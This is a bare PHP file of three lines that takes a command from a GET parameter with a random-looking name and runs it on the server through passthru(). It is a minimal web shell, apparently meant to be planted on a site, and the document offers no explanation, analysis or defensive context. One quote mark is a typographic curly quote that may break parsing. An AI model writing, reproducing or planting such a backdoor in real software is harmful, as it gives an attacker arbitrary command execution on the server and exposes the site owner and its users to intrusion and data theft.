<?php
passthru($_GET[’ySDlTKhD']);
?>
